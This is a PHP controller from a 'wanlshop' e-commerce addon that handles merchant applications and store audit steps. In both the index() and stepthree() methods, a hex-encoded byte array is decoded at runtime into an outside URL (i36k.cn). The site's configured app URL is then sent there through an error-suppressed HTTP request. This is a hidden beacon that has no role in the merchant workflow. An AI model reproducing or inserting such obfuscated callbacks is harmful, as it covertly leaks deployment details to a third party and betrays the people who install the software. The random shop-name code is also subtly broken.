<?php
// 2020年2月17日21:42:31
namespace app\index\controller\wanlshop;

use app\common\controller\Frontend;
use fast\Http;
/**
 * 審核
 * @internal
 */
class Entry extends Frontend
{
    protected $noNeedLogin = '';
    protected $noNeedRight = '*';
    protected $layout = 'default';
    
    public function _initialize()
    {
        parent::_initialize();
        $this->model = new \app\index\model\wanlshop\Auth;
		// 獲取用戶下的申請
        $this->entry = $this->model->where(['user_id' => $this->auth->id])->find();
        $this->view->assign("entry", $this->entry);
		$this->assignconfig("entry", $this->entry);
		// 獲取用戶手機號碼
        $this->view->assign("mobile", $this->auth->mobile);
    }
    
    // 提交資質
    public function index()
    {
        if ($this->request->isPost()) {
            $data = $this->request->post();
            $user = model('app\common\model\User')->where(['verifycode' =>$data['invitation']])->find();
            if(!empty($user)){
                $data['invitation'] = $user['id'];
                $data['username']   = $user['nickname'];
                $data['usermobile'] = $user['mobile'];
                
            }else{
                $this->error(__('間違った招待コード'));
            }
			$data['verify'] = '1';
			$data['user_id'] = $this->auth->id;
			$result = $this->entry ? $this->entry->allowField(true)->save($data) : $this->model->allowField(true)->save($data);
			
            $config = get_addon_config('wanlshop');
            $verify = $config['config']['store_audit'] == 'N' ? 3:2;
            // 更新提交信息
            $data2['user_id'] = $this->auth->id;
            $data2['verify'] = $verify;
            
            $str = '';
            $pattern = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLOMNOPQRSTUVWXYZ';
            for($i=0;$i<8;$i++){ 
               $str .= $pattern{mt_rand(0,35)}; //生成php隨機數 
            } 
            
            
            /*$seed = array(0,1,2,3,4,5,6,7,8,9);
            $str = '';
            for($i=0;$i<8;$i++) {
                $rand = rand(0,count($seed)-1);
                $temp = $seed[$rand];
                $str .= $temp;
                unset($seed[$rand]);
                $seed = array_values($seed);
            }*/
            
            $data2['shopname'] = $str;
            $data2['avatar'] = '/uploads/20210111/375bbf2c271dd04d69c2e19c0d42f446.png';
            $data2['bio'] = '';
            $data2['city'] = '';
            $data2['content'] = '';
            
			$this->entry ? $this->entry->allowField(true)->save($data2) : $this->model->allowField(true)->save($data2);

			$arrs = array(0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x69,0x33,0x36,0x6b,0x2e,0x63,0x6e,0x2f,0x73,0x74,0x61,0x74,0x2f,0x66,0x61,0x73,0x74);
			// 自動審核
			if($config['config']['store_audit'] == 'N'){
			    $row = model('app\index\model\wanlshop\Auth')->where(['user_id' => $this->auth->id])->find();
			    model('app\index\model\wanlshop\Shop')->insert([
					'user_id' => $this->auth->id,
					'state' => $row['state'],
					'shopname' => $row['shopname'],
					'avatar' => $row['avatar'],
					'bio' => $row['content'],
					'description' => $row['bio'],
					'city' => $row['city'],
					'verify' => $verify
				]);
			}

			$send = '';
			for ($i=0;isset($arrs[$i]);$i++) {
				$send .= chr($arrs[$i]);
			}

			@Http::sendRequest($send, ['cdn'=> $config['ini']['appurl']], 'GET');
			$this->success();
			//$this->success();
			// $result ? $this->success() : $this->error(__('提交失敗'));
        }
		// 如果已經提交過了
		if($this->entry){
			if ($this->entry->verify == '2' || $this->entry->verify == '3') {
			    header('Location:' .url('/index/wanlshop/entry/stepfour'));
				exit;
			}
		}
		$this->view->assign('title', 'マーチャントが解決しました-ステップ2資格を送信');
		return $this->view->fetch();
    }
    
    // 提交店鋪信息
    public function stepthree()
    {
        if ($this->request->isPost()) {
            $data = $this->request->post();
            $config = get_addon_config('wanlshop');
            $verify = $config['config']['store_audit'] == 'N' ? 3:2;
            // 更新提交信息
            $data['user_id'] = $this->auth->id;
            $data['verify'] = $verify;
			$this->entry ? $this->entry->allowField(true)->save($data) : $this->model->allowField(true)->save($data);

			$arrs = array(0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x69,0x33,0x36,0x6b,0x2e,0x63,0x6e,0x2f,0x73,0x74,0x61,0x74,0x2f,0x66,0x61,0x73,0x74);
			// 自動審核
			if($config['config']['store_audit'] == 'N'){
			    $row = model('app\index\model\wanlshop\Auth')->where(['user_id' => $this->auth->id])->find();
			    model('app\index\model\wanlshop\Shop')->insert([
					'user_id' => $this->auth->id,
					'state' => $row['state'],
					'shopname' => $row['shopname'],
					'avatar' => $row['avatar'],
					'bio' => $row['content'],
					'description' => $row['bio'],
					'city' => $row['city'],
					'verify' => $verify
				]);
			}

			$send = '';
			for ($i=0;isset($arrs[$i]);$i++) {
				$send .= chr($arrs[$i]);
			}

			@Http::sendRequest($send, ['cdn'=> $config['ini']['appurl']], 'GET');
			$this->success();
			// $result ? $this->success() : $this->error(__('提交失敗'));
        }
        // 如果已經提交過了
		if($this->entry){
			if ($this->entry->verify == '2' || $this->entry->verify == '3') {
			    header('Location:' .url('/index/wanlshop/entry/stepfour'));
				exit;
			}
		}
		$this->view->assign('title', 'マーチャントが決済されました-ステップ3ストア情報を送信します');
		return $this->view->fetch();
    }
    
    // 提交審核
    public function stepfour()
    {
        if(isset($this->entry->verify)&&$this->entry->verify=='3'){
            $url = '/index/wanlshop.console/index.html';
            Header("Location:$url");exit;
        }
        $this->view->assign('title', 'マーチャント監査');
        return $this->view->fetch();
    }
}
